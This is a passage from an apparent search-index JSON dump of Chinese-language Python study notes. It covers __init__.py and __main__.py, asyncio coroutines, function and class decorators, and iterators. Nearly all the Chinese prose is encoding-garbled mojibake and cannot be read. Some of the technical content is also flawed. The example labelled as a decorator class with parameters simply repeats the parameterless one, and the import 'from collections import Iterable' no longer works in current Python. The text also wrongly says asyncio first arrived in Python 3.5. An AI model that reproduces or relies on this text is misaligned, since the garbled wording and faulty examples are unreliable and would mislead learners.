å½“åœ¨æ–‡ä»¶å¤¹ä¸‹æ—¶ __init__.py è¡¨ç¤ºæ˜¯ä¸€ä¸ªæ¨¡å—(æŠŠå½“å‰æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹è§†ä¸ºä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºæŠŠæ­¤æ–‡ä»¶å¤¹çš„ä¸Šä¸€å±‚åŠ å…¥path) __main__.py è¡¨ç¤ºæ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹å¯ä»¥ç›´æ¥æ‰§è¡Œï¼ˆæŠŠå½“å‰æ–‡ä»¶æ‰€åœ¨è·¯å¾„åŠ å…¥åˆ°sys.pathï¼‰ ä¸¾ä¸ªä¾‹å­, æŠŠä»–ä»¬éƒ½æ”¾åˆ° test æ–‡ä»¶å¤¹ä¸‹ æ‰§è¡Œ pyton test åªä¼šæ‰§è¡Œ __main__.py æ‰§è¡Œ python -m test ä¼šå…ˆæ‰§è¡Œ __init__.py ï¼Œ å†æ‰§è¡Œ __main__.py","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__init__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__init__.html"},{"title":"åç¨‹","text":"å¸¸ç”¨çš„å¼‚æ­¥åº“è§: /docs/åç«¯/python/pythonæ ‡å‡†åº“/asyncio åŸºäºpythonç‰¹æ€§, äºæ˜¯æœ‰äº†å•çº¿ç¨‹å†…å¤šä»»åŠ¡, å³åç¨‹, æ˜¯ä¸€ç§è½»é‡çº§çº¿ç¨‹ (å¦ä¸€æ–¹é¢, é¿å…äº†çº¿ç¨‹åœ¨å†…æ ¸çš„åˆ‡æ¢, è€Œæ˜¯ç”¨æˆ·æ€ç±»ä¼¼å‡½æ•°çš„å¿«æ·åˆ‡æ¢) è¿™é‡Œä¸»è¦é€‚ç”¨äº python3.5 ä»¥ä¸Šçš„ç‰ˆæœ¬(asyncioæ˜¯3.5ä»¥åæ‰å¼•å…¥çš„) å®šä¹‰ä¸€ä¸ªå¼‚æ­¥å‡½æ•°: async def say_hello(): print(aa := 'hello') return aa åŒæ­¥å‡½æ•°ä¸­ä½¿ç”¨ run_until_complete åŒæ­¥è·å–ç»“æœ: import asyncio def test_a(): loop = asyncio.get_event_loop() # ä½¿ç”¨ run_until_complete åŒæ­¥è·å–ç»“æœ res = loop.run_until_complete(say_hello()) print(f'end {res}',) åœ¨åç¨‹å‡½æ•°ä¸­ä½¿ç”¨awaitä¹Ÿå¯ä»¥è·å–ç»“æœï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯éœ€è¦ä¸€ä¸ªlookæ¥è¿›è¡Œè·å–ç»“æœ: async def some_a_a(): res = await say_hello() # å¤šä¸ªåç¨‹å¹¶å‘æ‰§è¡Œ # æ–¹æ³•1ï¼šä½¿ç”¨ asyncio.gather res1, res2 = await asyncio.gather(say_hello(), say_hello()) # æ–¹æ³•2ï¼šä½¿ç”¨ asyncio.ensure_future åˆ›å»º taskï¼Œæˆ–è€…ä½¿ç”¨ asyncio.create_task(), æš‚æ—¶è¿˜ä¸ç¡®å®šåŒºåˆ«ï¼Œä¸è¿‡å‰è€…åœ¨æŸäº›æƒ…å†µä¸‹ä¼šè§¦å‘åè€…ï¼Œ # è¿˜å¯ä»¥è°ƒç”¨futureå¯¹è±¡ # æ­¤æ—¶è¿›å…¥ pending çŠ¶æ€ï¼Œ å¯ä»¥é€šè¿‡ task.done() -> done è·å–æ˜¯å¦æ‰§è¡Œ task1, task2 = asyncio.ensure_future(say_hello()), asyncio.ensure_future(say_hello()) # await task1, task2 # res11, res22 = task1.result(), task2.result() res11, res22 = await task1, await task2 print(res, res1, res2, res11, 'res11', res22) return 1 åŒæ­¥å‡½æ•°ä¸­ç›´æ¥é€šè¿‡ runè°ƒç”¨è·å–ç»“æœ: def test_run(): # ç›´æ¥é€šè¿‡ runè°ƒç”¨è·å–ç»“æœï¼Œ å°† some_a_a è½¬æ¢ä¸ºä¸€ä¸ªtask aa = asyncio.run(some_a_a()) print(aa) asyncio.wait å’Œ asyncio.gather è¯¦æƒ…å¯å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/asyncio await asyncio.wait(task_list) await asyncio.gather(*task_list) ç›¸åŒ ä»åŠŸèƒ½ä¸Šçœ‹ï¼Œasyncio.wait å’Œ asyncio.gather å®ç°çš„æ•ˆæœæ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯æŠŠæ‰€æœ‰ Task ä»»åŠ¡ç»“æœæ”¶é›†èµ·æ¥ã€‚ ä¸åŒ asyncio.wait ä¼šè¿”å›ä¸¤ä¸ªå€¼ï¼š done å’Œ pendingï¼Œ done ä¸ºå·²å®Œæˆçš„åç¨‹ Taskï¼Œpending ä¸ºè¶…æ—¶æœªå®Œæˆçš„åç¨‹ Taskï¼Œ éœ€é€šè¿‡ future.result è°ƒç”¨ Task çš„ resultï¼› è€Œasyncio.gather è¿”å›çš„æ˜¯æ‰€æœ‰å·²å®Œæˆ Task çš„ resultï¼Œ ä¸éœ€è¦å†è¿›è¡Œè°ƒç”¨æˆ–å…¶ä»–æ“ä½œï¼Œå°±å¯ä»¥å¾—åˆ°å…¨éƒ¨ç»“æœã€‚ asyncio ä¸­awaitå’Œcreate_taskçš„åŒºåˆ« å‚è€ƒ: https://blog.csdn.net/luchengtao11/article/details/124527729 awaitçš„ç†è§£ ç«‹å³å¼€å§‹æ‰§è¡Œåç¨‹å¯¹è±¡ï¼Œå¹¶å…è®¸å®ƒè¢«æŒ‚èµ·ã€‚--å¦‚æœæ²¡æœ‰å¯è¢«æŒ‚èµ·çš„é€»è¾‘ï¼Œåˆ™ä¸ä¼šè®©å‡ºæ‰§è¡Œæƒ ä¸ taskçš„ä¸åŒä¹‹å¤„ create_taskï¼Œæ˜¯åœ¨loopé‡Œæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åœ¨loopè°ƒåº¦è¯¥taskä¹‹å‰ï¼Œå…¶ä»–çš„taskè¿˜æ˜¯æœ‰æœºä¼šè¿è¡Œçš„ã€‚ awaitä½¿ç”¨çš„å½“å‰çš„contextï¼Œè€Œcreate_taskä¼šæ‹·è´ä¸€ä»½context æ€»ç»“å°±æ˜¯ï¼šcreate_taskçš„æ¶ˆè€—ä¼šæ›´é«˜ä¸€äº›ã€‚awaitæ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœæ²¡æœ‰å¯ä»¥è¢«æŒ‚èµ·çš„åœ°æ–¹ï¼Œåˆ™å…¶ä»–ä»»åŠ¡å°±æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚ ç®€è€Œè¨€ä¹‹, åœ¨ä»»åŠ¡è°ƒåº¦æ‰§è¡Œä¸­, ç”±äºæ— æ³•åœ¨åŒæ­¥ä»»åŠ¡ä¸­å†ä½¿ç”¨æ—¶é—´å¾ªç¯è·å–ç»“æœ, æ‰€ä»¥åªæœ‰å®šä¹‰ä¸ºå¼‚æ­¥æ–¹æ³•ä½¿ç”¨await, æˆ–è€…åœ¨åŒæ­¥ä»»åŠ¡ä¸­åˆ›å»ºä¸€ä¸ªä»»åŠ¡, å¹¶ç»™ä»–è¶³å¤Ÿæ—¶é—´ä»¥å¾—åˆ°æ‰§è¡Œ, åˆ›å»ºä»»åŠ¡ä¼šæ”¾åˆ°äº‹ä»¶å¾ªç¯ä¸­, ç­‰å¾…å¼‚æ­¥è‡ªåŠ¨è°ƒåº¦æ‰§è¡Œ. å¤šçº¿ç¨‹çš„äº‹ä»¶å¾ªç¯ ä¸€èˆ¬è€Œè¨€, åªèƒ½æ˜¯ä¸»çº¿ç¨‹æ‹¥æœ‰è‡ªå·±çš„äº‹ä»¶å¾ªç¯, å­çº¿ç¨‹æ— æ³•è·å–ä¸»çº¿ç¨‹çš„loop, è‹¥å­çº¿ç¨‹éœ€è¦, å¯ä»¥åœ¨æ–°å»ºä¸€ä¸ªloopç»™å­çº¿ç¨‹ä½¿ç”¨, å°¤å…¶æ˜¯guiç¼–ç¨‹çš„æ—¶å€™, guiçº¿ç¨‹åªèƒ½åœ¨ä¸»çº¿ç¨‹è·‘, é‚£ä¹ˆå½“å­˜åœ¨å…¨å±€çš„éguièƒ½å¤„ç†çš„å®æ—¶ç›‘å¬æ—¶, é‚£ä¹ˆå°±åªèƒ½åœ¨å­çº¿ç¨‹è·‘äº†(æˆ–è€…æ–°å»ºä¸€ä¸ªè¿›ç¨‹, è‡³å°‘ç›®å‰æˆ‘æ˜¯æ²¡æœ‰å…¶ä»–åŠæ³•)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Coroutine.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Coroutine.html"},{"title":"è£…é¥°å™¨","text":"è£…é¥°å™¨åªä¼šåœ¨å‡½æ•°å®šä¹‰æ—¶è¢«è°ƒç”¨ä¸€æ¬¡ã€‚æœ‰æ—¶å€™ä½ å»æ‰è£…é¥°å™¨çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆä½ åªéœ€è¦ç®€å•çš„è¿”å›è¢«è£…é¥°å‡½æ•°å³å¯ã€‚ å‡½æ•°è£…é¥°å™¨ æ™®é€šè£…é¥°å™¨: # å¼‚æ­¥æ”¾åˆ°çº¿ç¨‹æ± æ‰§è¡Œ def async_run_in_thread_pool(fn): # åˆ·æ–° __name__ @functools.wraps(fn) async def wrapper(*args, **kwargs): def _exec_fn(params): # è¿™æ ·å†™æ˜¯ä¸ºäº†å…¼å®¹ï¼Œ run_in_executor çš„å‚æ•°åªæœ‰ *args _arg = params[0] _kwarg = params[1] return fn(*_arg, **_kwarg) loop = asyncio.get_running_loop() executor = ThreadPoolExecutor() return await loop.run_in_executor(executor, _exec_fn, (args, kwargs,)) return wrapper å¸¦å‚æ•°çš„è£…é¥°å™¨, å°±æ˜¯åœ¨è£…é¥°å™¨å¤–éƒ¨å†å¥—ä¸€å±‚å¸¦å‚è£…é¥°å™¨: def async_run_in_thread_pool_with_params(*args, **kwargs): print(args, kwargs) return async_run_in_thread_pool ä½¿ç”¨: @async_run_in_thread_pool_with_params(33, a=1, b=2) def add(a, b): return a + b # è¾“å‡ºä¼šå¢åŠ  # (33,) {'a': 1, 'b': 2} è£…é¥°å™¨ç±» è‡ªå®šä¹‰ __call__ å‡½æ•° ç”¨ç±»ä¹Ÿå¯ä»¥å®ç°ä¸€ä¸ªè£…é¥°å™¨ã€‚ ç±»èƒ½å®ç°è£…é¥°å™¨çš„åŠŸèƒ½ï¼Œ æ˜¯ç”±äºå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯å®ƒçš„ __call__ æ–¹æ³•: class Demo: def __call__(self): print('æˆ‘æ˜¯ Demo') demo = Demo() demo() è¾“å‡º: æˆ‘æ˜¯ Demo é€šè¿‡è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨ç±»çš„æ–¹å¼æ¥å®Œæˆè£…é¥°å™¨ï¼ŒåŠŸèƒ½ä¸åˆšå¼€å§‹ç”¨å‡½æ•°å®ç°çš„ä¸€è‡´: class Decorator: def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print('123') return self.func(*args, **kwargs) @Decorator def say_hello(): print('åŒå­¦ä½ å¥½') say_hello() è¾“å‡º: 123 åŒå­¦ä½ å¥½ ä¸å¸¦å‚æ•°è£…é¥°å™¨ç±» æ³¨æ„, ä½¿ç”¨çš„æ—¶å€™æ˜¯, @è£…é¥°å™¨ç±»(), ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨çš„æ˜¯å¯¹è±¡çš„å®ä¾‹, ä¸è¢«è£…é¥°çš„å‡½æ•°æ˜¯ä¸€ä¸€ç»‘å®š(åªè¦æ²¡æœ‰å•ä¾‹): # ä¸å¸¦å‚æ•°è£…é¥°å™¨ç±» # è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ æ— æ³•ä½¿ç”¨ @functools.wraps æ¥åˆ·æ–° class RunInThreadPool(object): _thread_pool: ThreadPoolExecutor = None @classmethod def _create_thread_pool(cls): if not cls._thread_pool: cls._thread_pool = ThreadPoolExecutor() def __init__(self, fun): self._fun = fun self._create_thread_pool() def __call__(self, *args, **kwargs): _future = self._thread_pool.submit(self._fun, *args, **kwargs) # ä¼šé˜»å¡ return _future.result() å¸¦å‚æ•°è£…é¥°å™¨ç±» æ— æ³•ä½¿ç”¨ @functools.wraps æ¥åˆ·æ–°: # ä¸å¸¦å‚æ•°è£…é¥°å™¨ç±» # è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ æ— æ³•ä½¿ç”¨ @functools.wraps æ¥åˆ·æ–° class RunInThreadPool(object): _thread_pool: ThreadPoolExecutor = None @classmethod def _create_thread_pool(cls): if not cls._thread_pool: cls._thread_pool = ThreadPoolExecutor() def __init__(self, fun): self._fun = fun self._create_thread_pool() def __call__(self, *args, **kwargs): _future = self._thread_pool.submit(self._fun, *args, **kwargs) # ä¼šé˜»å¡ return _future.result() ä¸€äº›å®˜æ–¹è£…é¥°å™¨ wrapsè£…é¥°å™¨, ä¸€ä¸ªå‡½æ•°ä¸æ­¢æœ‰ä»–çš„æ‰§è¡Œè¯­å¥ï¼Œè¿˜æœ‰ç€ __name__`ï¼ˆå‡½æ•°åï¼‰ï¼Œ`__doc__ ï¼ˆè¯´æ˜æ–‡æ¡£ï¼‰ç­‰å±æ€§: def decorator(func): def wrapper(*args, **kwargs): \"\"\"doc of wrapper\"\"\" print('123') return func(*args, **kwargs) return wrapper @decorator def say_hello(): \"\"\"doc of say hello\"\"\" print('åŒå­¦ä½ å¥½') print(say_hello.__name__) print(say_hello.__doc__) è¾“å‡º: wrapper doc of wrapper ç”±äºè£…é¥°å™¨è¿”å›äº† wrapper å‡½æ•°æ›¿æ¢æ‰äº†ä¹‹å‰çš„ say_hello å‡½æ•°ï¼Œå¯¼è‡´å‡½æ•°åï¼Œå¸®åŠ©æ–‡æ¡£å˜æˆäº† wrapper å‡½æ•°çš„äº†ã€‚ è§£å†³è¿™ä¸€é—®é¢˜çš„åŠæ³•æ˜¯é€šè¿‡ /docs/åç«¯/python/pythonæ ‡å‡†åº“/functools æ¨¡å—ä¸‹çš„ wraps è£…é¥°å™¨: from functools import wraps def decorator(func): @wraps(func) def wrapper(*args, **kwargs): \"\"\"doc of wrapper\"\"\" print('123') return func(*args, **kwargs) return wrapper @decorator def say_hello(): \"\"\"doc of say hello\"\"\" print('åŒå­¦ä½ å¥½') print(say_hello.__name__) print(say_hello.__doc__) è¾“å‡º: say_hello doc of say hello å†…ç½®è£…é¥°å™¨ æœ‰ä¸‰ç§æˆ‘ä»¬ç»å¸¸ä¼šç”¨åˆ°çš„è£…é¥°å™¨ï¼Œ property ã€ staticmethod ã€ classmethod ï¼Œ ä»–ä»¬æœ‰ä¸ªå…±åŒç‚¹ï¼Œéƒ½æ˜¯ä½œç”¨äºç±»æ–¹æ³•ä¹‹ä¸Šã€‚ property è£…é¥°å™¨ ç”¨äºç±»ä¸­çš„å‡½æ•°ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åƒè®¿é—®å±æ€§ä¸€æ ·æ¥è·å–ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼: class XiaoMing: first_name = 'æ˜' last_name = 'å°' @property def full_name(self): return self.last_name + self.first_name xiaoming = XiaoMing() print(xiaoming.full_name) è¾“å‡º: å°æ˜ ä¾‹å­ä¸­æˆ‘ä»¬åƒè·å–å±æ€§ä¸€æ ·è·å– full_name æ–¹æ³•çš„è¿”å›å€¼ï¼Œè¿™å°±æ˜¯ç”¨ property è£…é¥°å™¨çš„æ„ä¹‰ï¼Œ æ—¢èƒ½åƒå±æ€§ä¸€æ ·è·å–å€¼ï¼Œåˆå¯ä»¥åœ¨è·å–å€¼çš„æ—¶å€™åšä¸€äº›æ“ä½œã€‚ staticmethod è£…é¥°å™¨ ç”¨äºç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™è¡¨ç¤ºè¿™ä¸ªæ–¹æ³•å°†ä¼šæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œ æ„å‘³ç€è¯¥æ–¹æ³•å¯ä»¥ç›´æ¥è¢«è°ƒç”¨æ— éœ€å®ä¾‹åŒ–ï¼Œä½†åŒæ ·æ„å‘³ç€å®ƒæ²¡æœ‰ self å‚æ•°ï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹åŒ–åçš„å¯¹è±¡: class XiaoMing: @staticmethod def say_hello(): print('åŒå­¦ä½ å¥½') XiaoMing.say_hello() # å®ä¾‹åŒ–è°ƒç”¨ä¹Ÿæ˜¯åŒæ ·çš„æ•ˆæœ # æœ‰ç‚¹å¤šæ­¤ä¸€ä¸¾ xiaoming = XiaoMing() xiaoming.say_hello() è¾“å‡º: åŒå­¦ä½ å¥½ åŒå­¦ä½ å¥½ classmethod è£…é¥°å™¨ ç”¨äºç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™è¡¨ç¤ºè¿™ä¸ªæ–¹æ³•å°†ä¼šæ˜¯ä¸€ä¸ªç±»æ–¹æ³•ï¼Œæ„å‘³ç€è¯¥æ–¹æ³•å¯ä»¥ç›´æ¥è¢«è°ƒç”¨æ— éœ€å®ä¾‹åŒ–ï¼Œ ä½†åŒæ ·æ„å‘³ç€å®ƒæ²¡æœ‰ self å‚æ•°ï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹åŒ–åçš„å¯¹è±¡ã€‚ ç›¸å¯¹äº staticmethod çš„åŒºåˆ«åœ¨äºå®ƒä¼šæ¥æ”¶ä¸€ä¸ªæŒ‡å‘ç±»æœ¬èº«çš„ cls å‚æ•°: class XiaoMing: name = 'å°æ˜' @classmethod def say_hello(cls): print('åŒå­¦ä½ å¥½ï¼Œ æˆ‘æ˜¯' + cls.name) print(cls) XiaoMing.say_hello() è¾“å‡º: åŒå­¦ä½ å¥½ï¼Œ æˆ‘æ˜¯å°æ˜ <class '__main__.XiaoMing'> å¤šä¸ªè£…é¥°å™¨çš„è°ƒç”¨é¡ºåº ä¾‹: # coding: utf-8 # # Copyright (C) 2022-2023, Inc. All Rights Reserved # # @Time : 2023/4/20 ä¸‹åˆ1:13 # @Author : yan que # @Email : yanquer@qq.com # @File : with_warp.py # @Project : mytest import logging _logger = logging.getLogger(__name__) _console_handler = logging.StreamHandler() _logger.addHandler(_console_handler) _logger.setLevel(logging.INFO) def warp1(fn): def _warp(*args, **kwargs): _logger.info(f'warp1 {fn} start') ret = fn(*args, **kwargs) _logger.info('warp1 end') return ret return _warp def warp2(fn): def _warp(*args, **kwargs): _logger.info(f'warp2 {fn} start') ret = fn(*args, **kwargs) _logger.info('warp2 end') return ret return _warp @warp1 @warp2 def main(): _logger.info('main start') print('main') _logger.info('main end') if __name__ == '__main__': main() è¾“å‡º: warp1 <function warp2.<locals>._warp at 0x10755a8b0> start warp2 <function main at 0x10755a820> start main start main end warp2 end warp1 end main mainçš„é¡ºåºä¸ç”¨ç®¡, å› ä¸ºæ—¥å¿—ä¸ç›´æ¥æ‰“å°ä¸æ˜¯ä¸€ä¸ªå¤„ç†æµ. å¯ä»¥çœ‹å‡º, è£…é¥°å™¨æ˜¯æŒ‰ç…§ä½¿ç”¨é¡ºåºè°ƒç”¨çš„, å‰é¢çš„è£…é¥°å™¨å®é™…è£…é¥°çš„å¹¶éç›´æ¥æ˜¯å‡½æ•°, è€Œæ˜¯åä¸€ä¸ªè£…é¥°å™¨. æŸäº›æƒ…å†µä¸‹éœ€è¦æ³¨æ„è°ƒç”¨é¡ºåº. è£…é¥°å™¨è°ƒç”¨è¯´æ˜ æ­¤å¤„ä¸»è¦è¯´æ˜æ˜¯å¦å¸¦å‚æ•°/æ‹¬å·æ—¶çš„ä¸åŒ ä¸å¸¦æ‹¬å·æ—¶çš„è°ƒç”¨: # Example use @logged def add(x, y): return x + y ç±»ä¼¼ç­‰ä»·äº: def add(x, y): return x + y add = logged(add) è¿™æ—¶å€™ï¼Œè¢«è£…é¥°å‡½æ•°ä¼šè¢«å½“åšç¬¬ä¸€ä¸ªå‚æ•°ç›´æ¥ä¼ é€’ç»™ logged è£…é¥°å™¨ã€‚å› æ­¤ï¼Œ logged() ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¢«åŒ…è£…å‡½æ•°æœ¬èº«ã€‚æ‰€æœ‰å…¶ä»–å‚æ•°éƒ½å¿…é¡»æœ‰é»˜è®¤å€¼ã€‚ å¸¦æ‹¬å·/å‚æ•°æ—¶çš„è°ƒç”¨: @logged(level=logging.CRITICAL, name='example') def spam(): print('Spam!') ç­‰ä»·äº: def spam(): print('Spam!') spam = logged(level=logging.CRITICAL, name='example')(spam) åˆå§‹è°ƒç”¨ logged() å‡½æ•°æ—¶ï¼Œè¢«åŒ…è£…å‡½æ•°å¹¶æ²¡æœ‰ä¼ é€’è¿›æ¥ã€‚å› æ­¤åœ¨è£…é¥°å™¨å†…ï¼Œå®ƒå¿… é¡»æ˜¯å¯é€‰çš„ã€‚è¿™ä¸ªåè¿‡æ¥ä¼šè¿«ä½¿å…¶ä»–å‚æ•°å¿…é¡»ä½¿ç”¨å…³é”®å­—æ¥æŒ‡å®šã€‚å¹¶ä¸”ï¼Œä½†è¿™äº›å‚æ•°è¢« ä¼ é€’è¿›æ¥åï¼Œè£…é¥°å™¨è¦è¿”å›ä¸€ä¸ªæ¥å—ä¸€ä¸ªå‡½æ•°å‚æ•°å¹¶åŒ…è£…å®ƒçš„å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Decorator.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Decorator.html"},{"title":"è¿­ä»£(ç”Ÿæˆå™¨/å¼)","text":"å­—å…¸ç”Ÿæˆå¼, ä¼šç«‹åˆ»è®¡ç®—: a = {id:0 for id in range(10)} åˆ—è¡¨ç”Ÿæˆå¼, ä¼šç«‹åˆ»è®¡ç®—: [x for x in iter_obj] ç”Ÿæˆå™¨, ä¸ä¼šç«‹åˆ»è®¡ç®—, è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨: (x for x in iter_obj) å¯è¿­ä»£å¯¹è±¡ åºåˆ—ï¼ˆSequenceï¼‰: An iterable which supports efficient element access using integer indices via the **getitem**() special method and defines a **len**() method that returns the length of the sequence. Some built-in sequence types are list, str, tuple, and bytes. Note that dict also supports **getitem**() and **len**(), but is considered a mapping rather than a sequence because the lookups use arbitrary immutable keys rather than integers. The collections.abc.Sequence abstract base class defines a much richer interface that goes beyond just **getitem**() and **len**(), adding count(), index(), **contains**(), and **reversed**(). Types that implement this expanded interface can be registered explicitly using register(). æç»ƒé‡ç‚¹å¦‚ä¸‹ï¼š å¯è¿­ä»£ï¼› æ”¯æŒä¸‹æ ‡è®¿é—®ï¼Œå³å®ç°äº† getitem () æ–¹æ³•ï¼ŒåŒæ—¶å®šä¹‰äº† len () æ–¹æ³•ï¼Œå¯é€šè¿‡ len() æ–¹æ³•è·å–é•¿åº¦ï¼› å†…ç½®çš„åºåˆ—ç±»å‹ï¼šlistã€strã€tupleã€bytesï¼› dict åŒæ ·æ”¯æŒ getitem () å’Œ len () ï¼Œä½†å®ƒä¸å½’å±äºåºåˆ—ç±»å‹ï¼Œå®ƒæ˜¯æ˜ å°„ç±»å‹ï¼Œå› ä¸ºå®ƒä¸èƒ½æ ¹æ®ä¸‹æ ‡æŸ¥æ‰¾ï¼Œåªèƒ½æ ¹æ® key æ¥æŸ¥æ‰¾ï¼› æŠ½è±¡ç±» collections.abc.Sequence è¿˜æä¾›äº†å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚ count()ã€index()ã€ contains () ã€ reversed () å¯ç”¨äºæ‰©å±•ï¼› æ€»ç»“ç»“è®ºï¼š åºåˆ—ä¸€å®šæ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œä½†å¯è¿­ä»£å¯¹è±¡ä¸ä¸€å®šæ˜¯åºåˆ— ã€‚ å¯è¿­ä»£å¯¹è±¡(Iterable) åœ¨ç±»é‡Œé¢å®šä¹‰__iter__æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨è¯¥ç±»åˆ›å»ºçš„å¯¹è±¡å°±æ˜¯å¯è¿­ä»£å¯¹è±¡ ç®€å•è®°å¿† ä½¿ç”¨forå¾ªç¯éå†å–å€¼çš„å¯¹è±¡å«åšå¯è¿­ä»£å¯¹è±¡, æ¯”å¦‚ï¼šåˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸ã€é›†åˆã€rangeã€å­—ç¬¦ä¸² åˆ¤æ–­: from collections import Iterable result = isinstance((3, 5), Iterable) print(\"æ˜¯å¦æ˜¯å¯è¿­ä»£å¯¹è±¡:\", result) å®ƒæ˜¯èƒ½å¤Ÿä¸€æ¬¡è¿”å›ä¸€ä¸ªæˆå‘˜çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ forâ€¦in éå†çš„ï¼› æ‰€æœ‰çš„åºåˆ—ç±»å‹ï¼ˆä¹Ÿå°±æ˜¯åé¢è¦è¯´åˆ°çš„ Sequenceï¼‰ï¼Œéƒ½æ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œå¦‚ listã€strã€tupleï¼Œè¿˜æœ‰æ˜ å°„ç±»å‹ dictã€æ–‡ä»¶å¯¹è±¡ç­‰éåºåˆ—ç±»å‹ä¹Ÿæ˜¯å¯è¿­ä»£å¯¹è±¡ï¼› è‡ªå®šä¹‰å¯¹è±¡åœ¨å®ç°äº† iter () æ–¹æ³•æˆ–è€…å®ç°äº† getitem () æ–¹æ³•åï¼Œä¹Ÿå¯ä»¥æˆä¸ºå¯è¿­ä»£å¯¹è±¡ï¼› iter() æ–¹æ³•æ¥å—ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œè¯¥æ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼ˆIteratorï¼‰ é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¯è¿­ä»£å¯¹è±¡å‘¢ï¼Ÿå¾ˆå®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•æ˜¯ isinstanceï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œæ–‡æ¡£ä»‹ç»å¦‚ä¸‹: class collections.abc.Iterable ABC for classes that provide the **iter**() method. Checking isinstance(obj, Iterable) detects classes that are registered as Iterable or that have an **iter**() method, but it does not detect classes that iterate with the **getitem**() method. The only reliable way to determine whether an object is iterable is to call iter(obj). ç®€å•è§£é‡Šå°±æ˜¯: é€šè¿‡ isinstance(obj, Iterable) åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯å¯è¿­ä»£å¯¹è±¡æ—¶ï¼Œ åªæœ‰å½“è¿™ä¸ªå¯¹è±¡è¢«æ³¨å†Œä¸º Iterable æˆ–è€…å½“å®ƒå®ç°äº† iter() ** æ–¹æ³•çš„æ—¶å€™ï¼Œæ‰è¿”å› Trueï¼Œ è€Œå¯¹äºå®ç°äº† **getitem () æ–¹æ³•çš„ï¼Œè¿”å›çš„æ˜¯ Falseã€‚ æ‰€ä»¥å½“åˆ¤æ–­æ˜¯å¦æ˜¯å¯è¿­ä»£å¯¹è±¡çš„æ–¹å¼æ˜¯è°ƒç”¨ iter(obj) ï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œè¯´æ˜æ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œåä¹‹åˆ™ä¸æ˜¯ã€‚ è¿­ä»£å™¨(Iterator) è¿­ä»£å™¨: An object representing a stream of data. Repeated calls to the iterator's **next**() method (or passing it to the built-in function next()) return successive items in the stream. When no more data are available a StopIteration exception is raised instead. At this point, the iterator object is exhausted and any further calls to its **next**() method just raise StopIteration again. Iterators are required to have an **iter**() method that returns the iterator object itself so every iterator is also iterable and may be used in most places where other iterables are accepted. One notable exception is code which attempts multiple iteration passes. A container object (such as a list) produces a fresh new iterator each time you pass it to the iter() function or use it in a for loop. Attempting this with an iterator will just return the same exhausted iterator object used in the previous iteration pass, making it appear like an empty container. ä¸€ä¸ªè¡¨ç¤º**æ•°æ®æµ**çš„å¯¹è±¡ï¼Œå¯é€šè¿‡é‡å¤è°ƒç”¨ next ï¼ˆæˆ–ä½¿ç”¨å†…ç½®å‡½æ•° next() ï¼‰æ–¹æ³•æ¥è·å–å…ƒç´ ã€‚å½“æ²¡æœ‰å…ƒç´ å­˜åœ¨æ—¶ï¼ŒæŠ›å‡º StopIteration å¼‚å¸¸ï¼› iter(obj) æ¥å—ä¸€ä¸ªè¿­ä»£å™¨ä½œä¸ºå‚æ•°æ—¶ï¼Œè¿”å›çš„æ˜¯å®ƒæœ¬èº«ã€‚åœ¨å¯è¿­ä»£å¯¹è±¡é‡Œæˆ‘ä»¬è¯´è¿‡ï¼Œiter(obj)æ–¹æ³•ä¸æŠ¥é”™ï¼Œè¯´æ˜å®ƒä¸€å®šæ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ã€‚å› æ­¤è¿­ä»£å™¨ä¸€å®šæ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼› ä¸€ä¸ªè¿­ä»£å™¨å¿…é¡»è¦å®ç° iter () æ–¹æ³•ã€‚ä½†å› 